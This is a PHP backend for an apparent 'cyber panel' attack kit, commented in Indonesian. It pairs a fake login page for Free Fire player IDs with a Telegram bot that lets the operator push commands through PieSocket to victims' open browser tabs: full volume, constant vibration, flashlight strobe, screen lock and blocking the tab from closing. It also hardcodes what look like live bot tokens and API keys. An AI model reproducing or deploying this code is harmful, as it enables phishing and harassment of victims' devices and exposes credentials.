<?php
// ================== KONFIG BOT ==================
$BOT_TOKEN = "9246172245:AAEKIfyG-w2Ih3dBDWc-T6eBiWH4FBurxw0";
$ADMIN_ID  = "8922169139";

// ================== KONFIG PIESOCKET ==================
$PIE_HOST = "5cef39ce662e0cf5696a862419a36eeb.db.pie.host";
$PIE_KEY  = "dRh20j9rCYsLouiy";

// ================== HELPER BOT ==================
function bot($chat, $text) {
    global $BOT_TOKEN;
    $ch = curl_init("https://api.telegram.org/bot$BOT_TOKEN/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(["chat_id" => $chat, "text" => $text]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// ================== HELPER PIESOCKET ==================
function send_piesocket($token, $cmd) {
    global $PIE_HOST, $PIE_KEY;
    $url = "https://$PIE_HOST/v3/1?api_key=$PIE_KEY&notify_self=1";
    $payload = json_encode(["token" => $token, "cmd" => $cmd]);
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

// ================== ROUTING ==================
$action = $_GET["action"] ?? "";

// ---------- 1. WEBHOOK TELEGRAM ----------
if ($action === "bot") {
    $update = json_decode(file_get_contents("php://input"), true);
    $chat = $update["message"]["chat"]["id"] ?? null;
    $text = $update["message"]["text"] ?? "";
    
    // Hanya admin yang bisa kontrol
    if (!$chat || (string)$chat !== (string)$ADMIN_ID) {
        http_response_code(200);
        exit;
    }

    // Format: /cmd <token/ID_FF> <perintah>
    if (preg_match('/^\/cmd\s+([a-zA-Z0-9_]+)\s+([a-zA-Z0-9_]+)/', $text, $matches)) {
        $token = $matches[1];
        $cmd = $matches[2];
        
        send_piesocket($token, $cmd);
        bot($chat, "✅ Perintah `$cmd` berhasil diteruskan ke target `$token`.\n\n*Pastikan target masih membuka halaman.*");
        
    } else {
        $help = "🤖 *CYBER PANEL BOT*\n\n";
        $help .= "Format kontrol:\n`/cmd <token_target> <perintah>`\n\n";
        $help .= "Contoh:\n`/cmd 12345678 force_lock`\n\n";
        $help .= "*Daftar Perintah:*\n";
        $help .= "`vol_force` - Volume penuh\n";
        $help .= "`vib_agg` - Getar terus\n";
        $help .= "`flash_strobo` - Senter kedip\n";
        $help .= "`force_lock` - Kunci layar\n";
        $help .= "`unlock` - Lepas kunci\n";
        $help .= "`anti_close` - Cegah tutup tab";
        bot($chat, $help);
    }
    exit;
}

// ---------- 2. LOGIN PALSU ----------
if ($action === "login") {
    $user = $_POST["username"] ?? "Unknown";
    // Kirim notif ke bot
    bot($ADMIN_ID, "🎯 Target Baru Login\n🆔 ID FF: `$user`\n\nGunakan `/cmd $user <perintah>` untuk kontrol.");
    // Redirect target ke panel
    header("Location: /?token=$user");
    exit;
}

http_response_code(404);
echo "404";